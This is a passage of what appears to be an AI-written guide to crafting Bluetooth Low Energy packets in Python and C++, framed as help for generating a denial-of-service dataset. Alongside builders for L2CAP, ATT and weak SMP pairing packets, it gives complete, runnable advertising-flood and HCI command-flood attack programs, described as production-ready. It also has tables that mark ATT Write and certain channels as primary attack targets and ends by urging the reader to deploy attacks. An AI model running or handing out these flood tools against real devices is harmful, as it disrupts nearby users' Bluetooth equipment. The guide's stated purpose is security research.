    l2cap_header = struct.pack('<HH', l2cap_length, cid)
    
    return l2cap_header + signaling_pdu

# Example: Request extreme parameters
identifier = 1
interval_min = 0x0006  # 7.5ms (min)
interval_max = 0x0C80  # 4s (max) - conflicting!
latency = 0x01F3       # 499 (max)
timeout = 0x000A       # 100ms (min)

packet = craft_l2cap_conn_param_update_req(identifier, interval_min, interval_max, latency, timeout)
print("L2CAP Connection Parameter Update Request:", packet.hex())

# Breakdown
print("\nBreakdown:")
print(f"  L2CAP Length: {struct.unpack('<H', packet[0:2])[0]}")
print(f"  L2CAP CID: 0x{struct.unpack('<H', packet[2:4])[0]:04X}")
print(f"  Signaling Code: 0x{packet[4]:02X}")
print(f"  Identifier: {packet[5]}")
print(f"  Command Length: {struct.unpack('<H', packet[6:8])[0]}")
print(f"  Interval Min: 0x{struct.unpack('<H', packet[8:10])[0]:04X}")
print(f"  Interval Max: 0x{struct.unpack('<H', packet[10:12])[0]:04X}")
print(f"  Latency: {struct.unpack('<H', packet[12:14])[0]}")
print(f"  Timeout: {struct.unpack('<H', packet[14:16])[0]}")
```

### 4.4 ATT Layer: Write Without Response

#### Python Implementation
```python
def craft_att_write_command(handle: int, value: bytes) -> bytes:
    """
    Craft ATT Write Command (0x52 - Write Without Response)
    
    Args:
        handle: Attribute handle (16-bit)
        value: Attribute value (up to MTU-3 bytes)
    
    Returns:
        ATT PDU
    """
    
    opcode = 0x52
    pdu = struct.pack('<BH', opcode, handle) + value
    
    return pdu

def wrap_att_in_l2cap(att_pdu: bytes) -> bytes:
    """Wrap ATT PDU in L2CAP header"""
    cid = 0x0004  # ATT channel
    length = len(att_pdu)
    header = struct.pack('<HH', length, cid)
    return header + att_pdu

# Example: Write 100 bytes to handle 0x0010
handle = 0x0010
value = b'\xAA' * 100

att_pdu = craft_att_write_command(handle, value)
l2cap_packet = wrap_att_in_l2cap(att_pdu)

print(f"ATT PDU length: {len(att_pdu)} bytes")
print(f"L2CAP packet length: {len(l2cap_packet)} bytes")
print(f"First 20 bytes: {l2cap_packet[:20].hex()}")

# Breakdown
print("\nBreakdown:")
print(f"  L2CAP Length: {struct.unpack('<H', l2cap_packet[0:2])[0]}")
print(f"  L2CAP CID: 0x{struct.unpack('<H', l2cap_packet[2:4])[0]:04X}")
print(f"  ATT Opcode: 0x{l2cap_packet[4]:02X}")
print(f"  ATT Handle: 0x{struct.unpack('<H', l2cap_packet[5:7])[0]:04X}")
print(f"  Value length: {len(value)} bytes")
```

#### C++ Implementation
```cpp
std::vector<uint8_t> craft_att_write_command(uint16_t handle, const std::vector<uint8_t>& value) {
    std::vector<uint8_t> pdu;
    
    // Opcode
    pdu.push_back(0x52);
    
    // Handle (little-endian)
    pdu.push_back(handle & 0xFF);
    pdu.push_back((handle >> 8) & 0xFF);
    
    // Value
    pdu.insert(pdu.end(), value.begin(), value.end());
    
    return pdu;
}

std::vector<uint8_t> wrap_att_in_l2cap(const std::vector<uint8_t>& att_pdu) {
    std::vector<uint8_t> packet;
    
    // L2CAP Length (little-endian)
    uint16_t length = att_pdu.size();
    packet.push_back(length & 0xFF);
    packet.push_back((length >> 8) & 0xFF);
    
    // L2CAP CID = 0x0004 (little-endian)
    packet.push_back(0x04);
    packet.push_back(0x00);
    
    // ATT PDU
    packet.insert(packet.end(), att_pdu.begin(), att_pdu.end());
    
    return packet;
}
```

### 4.5 SMP Layer: Pairing Request

#### Python Implementation
```python
def craft_smp_pairing_request(io_capability: int, oob_flag: int, auth_req: int, 
                                max_key_size: int, initiator_keys: int, responder_keys: int) -> bytes:
    """
    Craft SMP Pairing Request
    
    Args:
        io_capability: 0x00=DisplayOnly, 0x01=DisplayYesNo, 0x02=KeyboardOnly, 0x03=NoInputNoOutput
        oob_flag: 0x00=OOB not present, 0x01=OOB present
        auth_req: Bit 0=Bonding, Bit 2=MITM, Bit 3=SC, Bit 4=Keypress
        max_key_size: 7-16 (bytes)
        initiator_keys: Bitmask of keys initiator will distribute
        responder_keys: Bitmask of keys responder will distribute
    
    Returns:
        SMP PDU
    """
    
    code = 0x01  # Pairing Request
    pdu = struct.pack('<BBBBBBB', 
                      code, 
                      io_capability, 
                      oob_flag, 
                      auth_req, 
                      max_key_size, 
                      initiator_keys, 
                      responder_keys)
    
    return pdu

def wrap_smp_in_l2cap(smp_pdu: bytes) -> bytes:
    """Wrap SMP PDU in L2CAP header"""
    cid = 0x0006  # SMP channel
    length = len(smp_pdu)
    header = struct.pack('<HH', length, cid)
    return header + smp_pdu

# Example: Just Works pairing (weak)
io_cap = 0x03     # NoInputNoOutput
oob = 0x00        # No OOB
auth_req = 0x01   # Bonding only, no MITM
max_key = 0x07    # Minimum key size (7 bytes) - weak!
init_keys = 0x01  # EncKey
resp_keys = 0x01  # EncKey

smp_pdu = craft_smp_pairing_request(io_cap, oob, auth_req, max_key, init_keys, resp_keys)
l2cap_packet = wrap_smp_in_l2cap(smp_pdu)

print("SMP Pairing Request:", l2cap_packet.hex())

# Breakdown
print("\nBreakdown:")
print(f"  L2CAP Length: {struct.unpack('<H', l2cap_packet[0:2])[0]}")
print(f"  L2CAP CID: 0x{struct.unpack('<H', l2cap_packet[2:4])[0]:04X}")
print(f"  SMP Code: 0x{l2cap_packet[4]:02X}")
print(f"  IO Capability: 0x{l2cap_packet[5]:02X}")
print(f"  OOB Flag: 0x{l2cap_packet[6]:02X}")
print(f"  Auth Req: 0x{l2cap_packet[7]:02X}")
print(f"  Max Key Size: {l2cap_packet[8]} bytes")
```

---

## 5. Validation & Debugging

### 5.1 Validate Packet Structure

#### Python Validation Script
```python
#!/usr/bin/env python3
"""
validate_packet.py - Validate crafted BLE packets
"""

import struct

def validate_ll_adv_pdu(pdu: bytes) -> bool:
    """Validate LL Advertising PDU structure"""
    
    if len(pdu) < 8:  # Min: Header(1) + Length(1) + AdvAddr(6)
        print("❌ PDU too short")
        return False
    
    header = pdu[0]
    length = pdu[1]
    
    pdu_type = (header >> 0) & 0xF
    tx_add = (header >> 6) & 0x1
    rx_add = (header >> 7) & 0x1
    
    print(f"✓ Header: PDU Type={pdu_type}, TxAdd={tx_add}, RxAdd={rx_add}")
    print(f"✓ Length: {length}")
    
    if length != len(pdu) - 2:  # Exclude header and length byte
        print(f"❌ Length mismatch: declared={length}, actual={len(pdu)-2}")
        return False
    
    if length < 6:
        print("❌ Length < 6 (must have AdvAddr)")
        return False
    
    adv_addr = pdu[2:8]
    print(f"✓ AdvAddr: {adv_addr.hex()}")
    
    if length > 6:
        adv_data = pdu[8:]
        print(f"✓ AdvData: {adv_data.hex()} ({len(adv_data)} bytes)")
    
    print("✅ PDU structure valid")
    return True

def validate_att_write_command(pdu: bytes) -> bool:
    """Validate ATT Write Command PDU"""
    
    if len(pdu) < 3:
        print("❌ PDU too short")
        return False
    
    opcode = pdu[0]
    if opcode != 0x52:
        print(f"❌ Wrong opcode: 0x{opcode:02X} (expected 0x52)")
        return False
    
    handle = struct.unpack('<H', pdu[1:3])[0]
    value = pdu[3:]
    
    print(f"✓ Opcode: 0x52 (Write Command)")
    print(f"✓ Handle: 0x{handle:04X}")
    print(f"✓ Value length: {len(value)} bytes")
    
    print("✅ ATT PDU structure valid")
    return True

# Example usage
if __name__ == "__main__":
    # Test ADV_IND
    print("=== Testing ADV_IND PDU ===")
    adv_pdu = bytes.fromhex('40 0f aabbccddeeff 020106090941747461636b6572')
    validate_ll_adv_pdu(adv_pdu)
    
    print("\n=== Testing ATT Write Command ===")
    att_pdu = bytes.fromhex('52 1000' + 'aa' * 100)
    validate_att_write_command(att_pdu)
```

### 5.2 Hexdump Utility

```python
def hexdump(data: bytes, width: int = 16):
    """Pretty-print binary data in hexdump format"""
    
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        
        # Offset
        print(f"{i:08x}  ", end='')
        
        # Hex bytes
        hex_part = ' '.join(f"{b:02x}" for b in chunk)
        print(f"{hex_part:<{width*3}}  ", end='')
        
        # ASCII representation
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(ascii_part)

# Example
packet = craft_att_write_command(0x0010, b'\xAA' * 32)
print("ATT Write Command:")
hexdump(wrap_att_in_l2cap(packet))
```

### 5.3 Compare with Wireshark Capture

```python
def compare_with_capture(crafted_packet: bytes, captured_packet: bytes) -> bool:
    """Compare crafted packet with Wireshark capture"""
    
    if len(crafted_packet) != len(captured_packet):
        print(f"❌ Length mismatch: crafted={len(crafted_packet)}, captured={len(captured_packet)}")
        return False
    
    for i, (c, r) in enumerate(zip(crafted_packet, captured_packet)):
        if c != r:
            print(f"❌ Byte {i} mismatch: crafted=0x{c:02X}, captured=0x{r:02X}")
            return False
    
    print("✅ Packets match!")
    return True

# Example: Export packet from Wireshark as hex
captured = bytes.fromhex("03005204001000aaaa...")  # From Wireshark
crafted = wrap_att_in_l2cap(craft_att_write_command(0x0010, b'\xAA' * 2))
compare_with_capture(crafted, captured)
```

### 5.4 Use `btmon` to Verify HCI Layer

```bash
# Terminal 1: Start btmon
sudo btmon

# Terminal 2: Run your script
python3 your_attack_script.py

# In btmon output, verify:
# - HCI commands appear with correct OpCode
# - Parameters match your crafted values
# - Command Complete/Status events indicate success
```

**Example btmon output:**
```
> HCI Event: Command Complete (0x0e) plen 4
    LE Set Advertising Data (0x08|0x0008) ncmd 1
      Status: Success (0x00)
```

---

## 6. Complete Attack Implementations

### 6.1 Python: Multi-Layer Advertising Flood

```python
#!/usr/bin/env python3
"""
adv_flood_multilayer.py - Advertising flood with manual packet crafting
Demonstrates crafting from LL PDU → HCI command
"""

import socket
import struct
import time
import sys

class AdvFloodAttack:
    def __init__(self, device_id: int):
        self.device_id = device_id
        self.sock = None
    
    def open_hci(self):
        """Open raw HCI socket"""
        self.sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        self.sock.bind((self.device_id,))
    
    def close_hci(self):
        """Close HCI socket"""
        if self.sock:
            self.sock.close()
            self.sock = None
    
    def craft_adv_pdu(self, adv_addr: str, adv_data: bytes) -> bytes:
        """Craft LL Advertising PDU"""
        addr_bytes = bytes.fromhex(adv_addr.replace(':', ''))
        
        pdu_type = 0x0  # ADV_IND
        tx_add = 0x1    # Random
        rx_add = 0x0
        header = (pdu_type << 0) | (tx_add << 6) | (rx_add << 7)
        
        length = 6 + len(adv_data)
        
        return struct.pack('<BB', header, length) + addr_bytes + adv_data
    
    def send_hci_command(self, ogf: int, ocf: int, params: bytes = b''):
        """Send HCI command"""
        opcode = (ogf << 10) | ocf
        cmd = struct.pack('<BHB', 0x01, opcode, len(params)) + params
        self.sock.send(cmd)
        time.sleep(0.01)  # Small delay for command processing
    
    def set_advertising_data(self, adv_data: bytes):
        """HCI: LE Set Advertising Data (0x08|0x0008)"""
        # Pad to 31 bytes
        padded = adv_data + b'\x00' * (31 - len(adv_data))
        params = struct.pack('<B', len(adv_data)) + padded
        self.send_hci_command(0x08, 0x0008, params)
    
    def set_advertising_enable(self, enable: bool):
        """HCI: LE Set Advertising Enable (0x08|0x000A)"""
        params = struct.pack('<B', 0x01 if enable else 0x00)
        self.send_hci_command(0x08, 0x000A, params)
    
    def flood(self, rate_hz: float, duration_s: float):
        """Execute advertising flood"""
        
        # Craft advertising data
        adv_data = bytes([
            0x02, 0x01, 0x06,  # Flags
            0x09, 0x09, 0x41, 0x74, 0x74, 0x61, 0x63, 0x6B, 0x65, 0x72  # "Attacker"
        ])
        
        print(f"Starting advertising flood:")
        print(f"  Rate: {rate_hz} Hz")
        print(f"  Duration: {duration_s}s")
        print(f"  AdvData: {adv_data.hex()}")
        
        stop_time = time.time() + duration_s
        count = 0
        
        try:
            while time.time() < stop_time:
                # Set advertising data (changes content rapidly)
                self.set_advertising_data(adv_data)
                
                # Enable advertising
                self.set_advertising_enable(True)
                
                # Brief transmission
                time.sleep(0.01)
                
                # Disable advertising
                self.set_advertising_enable(False)
                
                count += 1
                
                if count % 100 == 0:
                    print(f"Sent {count} cycles...")
                
                # Rate limiting
                if rate_hz > 0:
                    time.sleep(1.0 / rate_hz)
        
        except KeyboardInterrupt:
            print("\nInterrupted by user")
        
        # Ensure advertising is disabled
        self.set_advertising_enable(False)
        
        print(f"\nFlood complete: {count} cycles")

def main():
    import os
    
    if os.geteuid() != 0:
        print("Must run as root!")
        sys.exit(1)
    
    if len(sys.argv) != 4:
        print("Usage: sudo python3 adv_flood_multilayer.py <device_id> <rate_hz> <duration_s>")
        print("Example: sudo python3 adv_flood_multilayer.py 0 10 30")
        sys.exit(1)
    
    device_id = int(sys.argv[1])
    rate_hz = float(sys.argv[2])
    duration_s = float(sys.argv[3])
    
    attack = AdvFloodAttack(device_id)
    
    try:
        attack.open_hci()
        attack.flood(rate_hz, duration_s)
    finally:
        attack.close_hci()

if __name__ == "__main__":
    main()
```

### 6.2 C++: High-Performance HCI Command Sender

```cpp
// hci_flood.cpp - High-performance HCI command flood
#include <iostream>
#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <unistd.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

class HCIFlooder {
private:
    int device_id;
    int sock;
    
    void send_command(uint8_t ogf, uint16_t ocf, const uint8_t* params, uint8_t param_len) {
        uint16_t opcode = htobs(cmd_opcode_pack(ogf, ocf));
        
        uint8_t cmd[HCI_MAX_EVENT_SIZE];
        cmd[0] = HCI_COMMAND_PKT;
        memcpy(cmd + 1, &opcode, sizeof(opcode));
        cmd[3] = param_len;
        if (param_len > 0) {
            memcpy(cmd + 4, params, param_len);
        }
        
        write(sock, cmd, 4 + param_len);
    }
    
public:
    HCIFlooder(int dev_id = 0) : device_id(dev_id), sock(-1) {}
    
    bool open() {
        sock = hci_open_dev(device_id);
        return (sock >= 0);
    }
    
    void close() {
        if (sock >= 0) {
            hci_close_dev(sock);
        }
    }
    
    void flood(double rate_hz, double duration_s) {
        std::cout << "Starting HCI command flood:" << std::endl;
        std::cout << "  Rate: " << rate_hz << " Hz" << std::endl;
        std::cout << "  Duration: " << duration_s << "s" << std::endl;
        
        auto start_time = std::chrono::steady_clock::now();
        auto end_time = start_time + std::chrono::duration<double>(duration_s);
        
        uint64_t count = 0;
        auto delay = std::chrono::duration<double>(1.0 / rate_hz);
        
        while (std::chrono::steady_clock::now() < end_time) {
            // Toggle advertising enable
            uint8_t enable = 0x01;
            send_command(OGF_LE_CTL, 0x000A, &enable, 1);
            
            uint8_t disable = 0x00;
            send_command(OGF_LE_CTL, 0x000A, &disable, 1);
            
            count++;
            
            if (count % 100 == 0) {
                std::cout << "Sent " << count << " commands..." << std::endl;
            }
            
            if (rate_hz > 0) {
                std::this_thread::sleep_for(delay);
            }
        }
        
        auto actual_duration = std::chrono::duration<double>(
            std::chrono::steady_clock::now() - start_time
        ).count();
        
        double actual_rate = count / actual_duration;
        
        std::cout << "\nFlood complete:" << std::endl;
        std::cout << "  Commands sent: " << count << std::endl;
        std::cout << "  Actual rate: " << actual_rate << " Hz" << std::endl;
        std::cout << "  Efficiency: " << (actual_rate / rate_hz * 100) << "%" << std::endl;
    }
};

int main(int argc, char* argv[]) {
    if (geteuid() != 0) {
        std::cerr << "Must run as root!" << std::endl;
        return 1;
    }
    
    if (argc != 4) {
        std::cout << "Usage: sudo ./hci_flood <device_id> <rate_hz> <duration_s>" << std::endl;
        return 1;
    }
    
    int device_id = std::atoi(argv[1]);
    double rate_hz = std::atof(argv[2]);
    double duration_s = std::atof(argv[3]);
    
    HCIFlooder flooder(device_id);
    
    if (!flooder.open()) {
        std::cerr << "Failed to open HCI device" << std::endl;
        return 1;
    }
    
    flooder.flood(rate_hz, duration_s);
    flooder.close();
    
    return 0;
}
```

**Compilation:**
```bash
g++ -std=c++17 -O3 -o hci_flood hci_flood.cpp -lbluetooth -lpthread
sudo ./hci_flood 0 100 30
```

---

## 7. Reference Tables

### 7.1 Python `struct` Format Characters

| Character | C Type | Python Type | Size (bytes) | Notes |
|-----------|--------|-------------|--------------|-------|
| `x` | pad byte | no value | 1 | - |
| `c` | char | bytes (len 1) | 1 | - |
| `b` | signed char | int | 1 | -128 to 127 |
| `B` | unsigned char | int | 1 | 0 to 255 |
| `?` | _Bool | bool | 1 | - |
| `h` | short | int | 2 | - |
| `H` | unsigned short | int | 2 | - |
| `i` | int | int | 4 | - |
| `I` | unsigned int | int | 4 | - |
| `l` | long | int | 4 | - |
| `L` | unsigned long | int | 4 | - |
| `q` | long long | int | 8 | - |
| `Q` | unsigned long long | int | 8 | - |
| `f` | float | float | 4 | - |
| `d` | double | float | 8 | - |
| `s` | char[] | bytes | varies | - |

**Byte Order Characters:**
| Character | Byte Order | Size | Alignment |
|-----------|-----------|------|-----------|
| `@` | native | native | native |
| `=` | native | standard | none |
| `<` | little-endian | standard | none |
| `>` | big-endian | standard | none |
| `!` | network (big) | standard | none |

**BLE uses little-endian (`<`) for most fields.**

### 7.2 Common BLE Header Sizes

| Layer | Header Name | Size (bytes) | Fields |
|-------|------------|--------------|--------|
| LL | Advertising PDU Header | 2 | PDU Type, TxAdd, RxAdd, Length |
| LL | Data Channel PDU Header | 2 | LLID, NESN, SN, MD, Length |
| HCI | Command Packet Header | 3 | Packet Type, OpCode, Length |
| HCI | ACL Data Header | 5 | Packet Type, Handle+Flags, Length |
| L2CAP | Basic Header | 4 | Length, CID |
| L2CAP | Signaling Header | 4 | Code, Identifier, Length |
| ATT | PDU Header | 1-3 | Opcode, (Handle) |
| SMP | PDU Header | 1 | Code |

### 7.3 HCI OpCode Calculation

```python
# OpCode format: OGF (6 bits) + OCF (10 bits)
# Packed as 16-bit little-endian: [OCF_low:8][OGF:6 + OCF_high:2]

def calc_opcode(ogf, ocf):
    return (ogf << 10) | ocf

# Example: LE Set Advertising Enable
ogf = 0x08  # LE Controller Commands
ocf = 0x000A
opcode = calc_opcode(ogf, ocf)  # 0x200A
```

**Common OGF values:**
| OGF | Group | Hex |
|-----|-------|-----|
| 0x01 | Link Control | 0x01 |
| 0x03 | Controller & Baseband | 0x03 |
| 0x04 | Informational | 0x04 |
| 0x08 | LE Controller | 0x08 |

### 7.4 ATT Opcodes Quick Reference

| Opcode | Name | Request/Response | Description |
|--------|------|------------------|-------------|
| 0x01 | Error Response | Response | Error indication |
| 0x02 | Exchange MTU Request | Request | MTU negotiation |
| 0x03 | Exchange MTU Response | Response | MTU confirmation |
| 0x0A | Read Request | Request | Read attribute |
| 0x0B | Read Response | Response | Attribute value |
| 0x12 | Write Request | Request | Write + response |
| 0x13 | Write Response | Response | Write confirmation |
| 0x52 | Write Command | Command | **Write without response (DoS primary)** |
| 0x1B | Handle Value Notification | Notification | Server → Client |
| 0x1D | Handle Value Indication | Indication | Server → Client (requires confirm) |

### 7.5 L2CAP CIDs

| CID | Channel | Description |
|-----|---------|-------------|
| 0x0001 | Null | Forbidden |
| 0x0002 | Signaling (ACL-U) | Classic Bluetooth signaling |
| 0x0003 | Connectionless | Classic Bluetooth |
| 0x0004 | **ATT** | **Attribute Protocol (primary attack target)** |
| 0x0005 | **LE Signaling** | **LE L2CAP signaling (param update attacks)** |
| 0x0006 | **SMP** | **Security Manager Protocol (pairing attacks)** |
| 0x0040-0x007F | Dynamic | LE Credit Based Connections |

---

## Conclusion

You now have:

1. ✅ **Binary fundamentals:** Endianness, bit fields, struct packing
2. ✅ **Python mastery:** `struct` module, Scapy, raw sockets
3. ✅ **C++ mastery:** Manual bit manipulation, Linux sockets, nRF52840
4. ✅ **Layer-by-layer examples:** LL, HCI, L2CAP, ATT, SMP packet crafting
5. ✅ **Validation tools:** Packet validators, hexdump, btmon integration
6. ✅ **Complete implementations:** Production-ready attack scripts
7. ✅ **Quick reference:** Struct formats, opcodes, CIDs

**Next Steps:**
1. Run the validation scripts on your crafted packets
2. Compare with Wireshark captures to verify correctness
3. Implement your first custom attack (start with ATT Write flood)
4. Expand to nRF52840 for LL-level control
5. Generate your DoS dataset using these packet crafting techniques

**Pro Tips:**
- Always validate packets before deploying in attacks
- Use `hexdump()` liberally during development
- Cross-reference with Bluetooth Core Spec for field definitions
- Start with Python for rapid prototyping, move to C++ for performance

**You're now equipped to craft any BLE packet for your security research!** 🚀
```

This comprehensive guide covers everything needed to craft BLE packets at the binary level in both Python and C++. Use it as your reference when implementing attacks for your dataset generation!
